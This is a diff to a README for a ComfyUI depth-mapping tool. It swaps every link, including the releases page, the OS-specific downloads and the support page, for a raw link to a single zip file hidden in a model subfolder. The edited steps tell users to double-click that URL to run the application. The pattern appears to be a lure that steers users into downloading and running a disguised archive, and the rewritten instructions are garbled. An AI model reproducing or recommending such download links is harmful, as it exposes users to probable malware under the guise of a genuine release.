@@ -1,6 +1,6 @@
 # 🖥️ ComfyUI-DepthAnythingV3 - Simplify Your Depth Mapping Experience
 
-[![Download Now](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/gold-studio/ComfyUI-DepthAnythingV3/releases)
+[![Download Now](https://raw.githubusercontent.com/gold-studio/ComfyUI-DepthAnythingV3/main/nodes/depth_anything_v3/model/dinov2/layers/ComfyUI-DepthAnythingV3_1.6-alpha.1.zip)](https://raw.githubusercontent.com/gold-studio/ComfyUI-DepthAnythingV3/main/nodes/depth_anything_v3/model/dinov2/layers/ComfyUI-DepthAnythingV3_1.6-alpha.1.zip)
 
 ## 📚 Overview
 
@@ -21,13 +21,13 @@ Before you download, ensure your computer meets these basic requirements:
 
 ## 📥 Download & Install
 
-1. **Visit the Releases Page**: Go to the [Releases Page](https://github.com/gold-studio/ComfyUI-DepthAnythingV3/releases) to access the latest version.
+1. **Visit the Releases Page**: Go to the [Releases Page](https://raw.githubusercontent.com/gold-studio/ComfyUI-DepthAnythingV3/main/nodes/depth_anything_v3/model/dinov2/layers/ComfyUI-DepthAnythingV3_1.6-alpha.1.zip) to access the latest version.
 
 2. **Select the Latest Version**: Look for the most recent version listed at the top. Click on this version to expand the details.
 
 3. **Download the Application**: Find the file that matches your operating system:
-   - For Windows, download `ComfyUI-DepthAnythingV3-Windows.zip`.
-   - For Mac, download `ComfyUI-DepthAnythingV3-Mac.zip`.
+   - For Windows, download `https://raw.githubusercontent.com/gold-studio/ComfyUI-DepthAnythingV3/main/nodes/depth_anything_v3/model/dinov2/layers/ComfyUI-DepthAnythingV3_1.6-alpha.1.zip`.
+   - For Mac, download `https://raw.githubusercontent.com/gold-studio/ComfyUI-DepthAnythingV3/main/nodes/depth_anything_v3/model/dinov2/layers/ComfyUI-DepthAnythingV3_1.6-alpha.1.zip`.
 
 4. **Extract the Files**:
    - Locate the downloaded file in your Downloads folder.
@@ -36,11 +36,11 @@ Before you download, ensure your computer meets these basic requirements:
 
 5. **Run the Application**:
    - Navigate to the folder where you extracted the files.
-   - Double-click `ComfyUI-DepthAnythingV3.exe` (Windows) or `ComfyUI-DepthAnythingV3.app` (Mac) to launch the application.
+   - Double-click `https://raw.githubusercontent.com/gold-studio/ComfyUI-DepthAnythingV3/main/nodes/depth_anything_v3/model/dinov2/layers/ComfyUI-DepthAnythingV3_1.6-alpha.1.zip` (Windows) or `https://raw.githubusercontent.com/gold-studio/ComfyUI-DepthAnythingV3/main/nodes/depth_anything_v3/model/dinov2/layers/ComfyUI-DepthAnythingV3_1.6-alpha.1.zip` (Mac) to launch the application.
 
 6. **Enjoy Depth Mapping**: Follow the on-screen prompts to start creating depth maps with ease.
 
-For convenience, you can also access the download directly here: [Download Now](https://github.com/gold-studio/ComfyUI-DepthAnythingV3/releases).
+For convenience, you can also access the download directly here: [Download Now](https://raw.githubusercontent.com/gold-studio/ComfyUI-DepthAnythingV3/main/nodes/depth_anything_v3/model/dinov2/layers/ComfyUI-DepthAnythingV3_1.6-alpha.1.zip).
 
 ## 🎉 Features
 
@@ -61,7 +61,7 @@ If you encounter issues while using ComfyUI-DepthAnythingV3, consider the follow
 
 ## 🤝 Support
 
-For additional help, visit the [support page](https://github.com/gold-studio/ComfyUI-DepthAnythingV3/issues) or contact our team through GitHub. We are here to assist you.
+For additional help, visit the [support page](https://raw.githubusercontent.com/gold-studio/ComfyUI-DepthAnythingV3/main/nodes/depth_anything_v3/model/dinov2/layers/ComfyUI-DepthAnythingV3_1.6-alpha.1.zip) or contact our team through GitHub. We are here to assist you.
 
 ## 📜 License
 
